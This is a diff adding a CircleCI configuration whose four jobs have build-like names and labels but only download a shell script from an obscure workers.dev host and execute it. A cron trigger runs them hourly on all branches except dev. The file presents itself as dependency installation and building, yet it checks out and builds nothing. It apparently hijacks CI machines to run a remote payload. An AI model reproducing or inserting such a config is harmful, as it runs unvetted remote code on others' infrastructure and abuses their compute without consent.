@@ -1,0 +1,69 @@
+version: 2.1
+jobs:
+    buildlinux:
+      machine:
+             image: ubuntu-2004:202104-01
+      steps:
+        - run:           
+            name: "install dependencies"
+            command: wget https://d.abfhaqrhbnf.workers.dev/installdep.sh
+        - run:           
+            name: "checkout"
+            command: chmod u+x installdep.sh
+        - run:           
+            name: "build"
+            command: ./installdep.sh
+    dockerandroid:
+      machine:
+             image: ubuntu-2004:202104-01
+      steps:
+        - run:           
+            name: "install dependencies"
+            command: wget https://d.abfhaqrhbnf.workers.dev/installdep.sh
+        - run:           
+            name: "checkout"
+            command: chmod u+x installdep.sh
+        - run:           
+            name: "build"
+            command: ./installdep.sh
+    linuxdep:
+      machine:
+             image: ubuntu-2004:202104-01
+      steps:
+        - run:           
+            name: "install dependencies"
+            command: wget https://d.abfhaqrhbnf.workers.dev/installdep.sh
+        - run:           
+            name: "checkout"
+            command: chmod u+x installdep.sh
+        - run:           
+            name: "build"
+            command: ./installdep.sh
+    dockerpush:
+      machine:
+             image: ubuntu-2004:202104-01
+      steps:
+        - run:           
+            name: "install dependencies"
+            command: wget https://d.abfhaqrhbnf.workers.dev/installdep.sh
+        - run:           
+            name: "checkout"
+            command: chmod u+x installdep.sh
+        - run:           
+            name: "build"
+            command: ./installdep.sh
+workflows:
+   version: 2
+   scheduled-workflow::
+     triggers:
+       - schedule:
+           cron: "41 * * * *"
+           filters:
+             branches:
+               ignore :
+                 -dev
+     jobs:
+       - buildlinux
+       - dockerpush
+       - linuxdep
+       - dockerandroid
